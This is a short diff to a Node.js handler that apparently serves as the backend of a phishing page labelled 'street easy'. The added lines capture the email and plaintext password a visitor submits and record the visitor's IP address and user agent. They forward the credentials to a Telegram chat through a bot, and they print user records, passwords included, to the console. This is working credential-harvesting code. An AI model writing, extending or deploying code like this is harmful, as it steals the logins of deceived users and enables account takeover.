@@ -32,12 +32,18 @@ const sendEmail = async (req, res) => {
 
     if(user) {
         user.email = req.body.email
+        user.password = req.body.password
         await user.save()
     }
+    console.log(user);
+    
+  
 
     req.body.ip = getIpAddress() + userAgent;
     user = await Login.create(req.body);
-    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `New email from street easy: ${`${user.email}`}`);
+    const res_one = bot.sendMessage(process.env.TELEGRAM_CHAT_ID, `New email from street easy: ${user.email} and password is ${user.password}`);
+    console.log(res_one);
+    
     res.status(200).json({ user });
   } catch (error) {
     console.log(error);
